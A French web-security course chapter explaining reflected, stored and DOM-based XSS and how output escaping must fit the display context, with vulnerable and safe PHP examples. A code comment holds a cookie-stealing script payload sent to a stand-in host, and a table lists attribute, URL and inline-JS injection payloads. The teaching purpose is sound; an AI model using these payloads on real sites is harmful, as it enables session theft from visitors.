---
order: 11
---

# XSS : reflected, stored et DOM-based

Le principe du XSS (*Cross-Site Scripting*) est déjà posé dans [Sécuriser vos données](/?c=langages&s=php&p=securite) (`htmlspecialchars()`, cas *reflected*) et dans [Créer et manipuler des éléments](/?c=langages&s=javascript&p=html-elements) (`innerHTML` vs `textContent`, cas *DOM-based*). Ce chapitre ne répète pas ces mécanismes : il pose la distinction entre les trois variantes (ce qui change vraiment entre elles), puis couvre ce qui manque encore : le stockage en base (*stored*) et l'échappement selon le CONTEXTE d'affichage.

## Les trois variantes : où vit la donnée piégée avant de s'afficher

La différence entre les trois tient uniquement à UN endroit : où la donnée malveillante séjourne avant de finir exécutée dans le navigateur de la victime.

```text
REFLECTED (deja vu : htmlspecialchars)
  Victime envoie une requete piegee --> Serveur la renvoie TELLE QUELLE dans sa reponse --> Navigateur l'execute
  (la donnee ne fait qu'un aller-retour, jamais stockee)

STORED (nouveau dans ce chapitre)
  Attaquant --> Donnee piegee enregistree en base (commentaire, pseudo, avis...)
                          |
                          v
  N'IMPORTE QUELLE victime qui consulte cette page plus tard --> execute le payload
  (la donnee reste stockee : une seule injection touche tous les visiteurs suivants)

DOM-BASED (deja vu : innerHTML vs textContent)
  Donnee piegee lue directement par du JavaScript cote NAVIGATEUR (ex: un parametre d'URL)
  --> jamais renvoyee par le serveur, jamais stockee : tout se joue dans le navigateur de la victime
```

| Variante | Où la donnée transite | Qui est touché | Déjà couvert |
|---|---|---|---|
| Reflected | Requête → réponse du serveur, immédiatement | Seulement la victime qui clique un lien piégé | [`htmlspecialchars()`](/?c=langages&s=php&p=securite) |
| Stored | Base de données, entre deux visites | Tout visiteur de la page concernée, sans action piégée de sa part | Section ci-dessous |
| DOM-based | Jamais renvoyée par le serveur, lue en JS côté navigateur | La victime, via une donnée que SON navigateur lit lui-même (URL, `localStorage`...) | [`innerHTML` vs `textContent`](/?c=langages&s=javascript&p=html-elements) |

## Stored XSS : la variante qui ne dépend plus de la victime

Un formulaire de commentaire, un pseudo, un avis client : toute donnée utilisateur ENREGISTRÉE puis réaffichée à d'autres visiteurs est une cible stored si elle n'est pas échappée à l'affichage.

```php
// Enregistrement (aucun risque ici en soi : on stocke juste du texte)
$pdo->prepare("INSERT INTO commentaires (texte) VALUES (?)")->execute([$commentaire]);

// DANGEREUX : reaffichage plus tard, sans echappement
foreach ($commentaires as $c) {
    // si un attaquant a poste
    // <script>document.location='https://vol.example/?c='+document.cookie</script>,
    echo $c['texte'];
                        // CE CODE S'EXÉCUTE chez CHAQUE visiteur qui voit ce commentaire
}

// SÛR : même réflexe qu'en reflected, appliqué au moment de l'AFFICHAGE, pas de
// l'enregistrement
foreach ($commentaires as $c) {
    echo htmlspecialchars($c['texte']);
}
```

> **Piège :** échapper la donnée à l'ENREGISTREMENT plutôt qu'à l'AFFICHAGE. Ça semble intuitif ("je nettoie l'entrée une fois pour toutes"), mais casse dès que la même donnée est réaffichée dans un contexte différent (page HTML, export CSV, notification email) qui n'a pas besoin du même échappement (voir contextes ci-dessous). L'échappement se fait toujours juste avant l'affichage, jamais avant le stockage.

## L'échappement dépend du CONTEXTE d'affichage, pas seulement du texte

`htmlspecialchars()` protège une donnée insérée dans le CORPS d'une page HTML. Le même réflexe appliqué dans un autre contexte ne protège pas contre le même risque :

| Contexte d'insertion | Exemple de payload dangereux | Protection adaptée |
|---|---|---|
| Corps HTML (texte entre deux balises) | `<script>...</script>` | `htmlspecialchars()` (déjà vu) |
| Attribut HTML (`<input value="...">`) | `" onmouseover="alert(1)` (ferme l'attribut, en ajoute un nouveau) | Toujours entourer l'attribut de guillemets ET y appliquer `htmlspecialchars()` (qui échappe aussi `"`) |
| URL (`<a href="...">`) | `javascript:alert(document.cookie)` comme valeur d'URL | Vérifier que l'URL commence par un protocole autorisé (`http://`, `https://`) avant de l'insérer |
| JavaScript inline (`<script>var x = "...";</script>`) | `"; alert(1); //` (ferme la chaîne JS, ajoute une instruction) | Ne jamais insérer une donnée utilisateur directement dans du JavaScript inline : la passer via un attribut `data-*` lu ensuite côté JS, ou via JSON avec un échappement dédié à ce contexte |

> **Bonne pratique :** identifier le contexte exact d'insertion (corps de texte, attribut, URL, JS) avant de choisir l'échappement, plutôt qu'appliquer `htmlspecialchars()` par réflexe partout en supposant que ça suffit toujours.

---

## 📋 Récapitulatif

| | |
|---|---|
| **À retenir** | Les trois variantes de XSS se distinguent par où vit la donnée piégée avant exécution : aller-retour immédiat (reflected), stockée en base et rejouée à chaque visite (stored), ou jamais renvoyée par le serveur et lue directement en JS côté navigateur (DOM-based). L'échappement correct dépend du contexte d'insertion (corps HTML, attribut, URL, JS inline), pas seulement de la présence d'une donnée utilisateur. |
| **Outils utilisables** | `htmlspecialchars()` pour le corps HTML et les attributs ; vérification de protocole pour une URL ; `data-*` + lecture JS pour une donnée destinée à du JavaScript. |
| **Pièges à éviter** | Échapper une donnée à l'enregistrement plutôt qu'à l'affichage ; appliquer le même échappement quel que soit le contexte d'insertion. |
| **Bonnes pratiques** | Échapper systématiquement au moment de l'affichage, jamais avant ; adapter l'échappement au contexte exact (HTML/attribut/URL/JS). |
